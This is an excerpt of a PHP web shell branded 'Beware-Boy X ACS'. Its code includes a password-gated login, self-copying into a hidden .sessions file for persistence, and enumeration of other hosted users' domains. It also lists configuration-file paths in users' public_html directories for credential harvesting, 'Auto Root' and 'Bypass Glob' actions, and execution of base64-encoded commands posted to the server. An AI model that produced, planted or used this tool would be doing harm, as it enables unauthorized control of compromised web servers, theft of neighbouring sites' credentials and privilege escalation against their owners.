...
$password="85246e91e236ba72dbbfa5539030a03d7969ded9";
$nm = "Boy-Acs";
function login() {
echo '<html>
    <head>
        ...
        <link rel="icon" href="https://res.cloudinary.com/dcuhaqztz/image/upload/v1710750097/Logo-acs.png">
    </head>
...
if (!is_file($_1_3_3_7 . '/.sessions/.' . nameBoyAcs() . ".tmp")) {
    copy($filena, $_1_3_3_7 . "/.sessions/." . nameBoyAcs() . ".tmp");
}
if (file_exists($_1_3_3_7 . "/.sessions/." . nameBoyAcs() . ".tmp")) {
    $_1_3_3 = $_1_3_3_7 . "/.sessions/." . nameBoyAcs() . ".tmp";
                        ...
                        if (function_exists('posix_getpwuid')) {
                            ...
                            if ($domain_jump == '') {
                                ...
                                foreach ($domains_jump[1] as $dj) {
                                    ...
                                    if ($user_jumping_url == $user_pro_jump) {echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
        ...
        foreach ($user_config[1] as $user_con) {
            ...
            if (is_readable($user_config_dir)) {
                $grab_config = [
                    ...
                    "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',"/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
                    ...
                    "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',"/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
                ];
...
<html>
    ...
    <center><img src="https://res.cloudinary.com/dcuhaqztz/image/upload/v1710750097/Logo-acs.png" height='230' widht='180' alt="logo" /></center>
    <center><p> Beware-Boy X ACS</p></center>
        <div class="container-fluid">
            <div class="py-3" id="main">
                <div class="p-4 rounded-3">
                    <table class="table table-borderless text-light">
                        <tr>
                            ...
                            <td style="width: 1%">:</td>
                            <td><font color="lime">Beware-Boy X ACS</font></td>
                        </tr>
                        <tr>
                    ...
                    <div class="collapse text-light mb-3" id="collapsetools">
                        ...
                        <div class="d-flex justify-content-center flex-wrap my-3">
                            ...
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=autoroot" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-hashtag"></i> Auto Root</a><a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=bypassglob" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-network-wired"></i> Bypass Glob</a>
                            ...
                            <?php if (isset($_POST['ucmd'])) : ?>
                                <div class="p-2">
                                    <div class="row justify-content-center">
                                        <div class="card text-dark col-md-7 mb-3">
                                            <?php
                                            // Dekode nilai command dari base64 sebelum menjalankannya$decoded_command = base64_decode($_POST['ucmd']);
                                            ?>
...
?>
                            ...
                            <tbody class="text-nowrap">
                                ...
                                <tr>
                                    <td>
                                        ...
                                        <?php elseif ($dir === '.') :  ?><a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                                        <?php else : ?>
                                        ...
                                        <!-- end php -->
                                            <?php
                                                echo '<a href="?dir='.$path.'&item='.$dir.'&action=chmod">';
                                                    ...
                                                    elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
                                                    echo perms($path.'/'.$dir);
                                                    if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir))echo '</a>';
                                            ?>
                    ...
                    <center><div class="text-light my-1">&#169; Beware-Boy</div></center>
                </div>
            </div>
        </div>
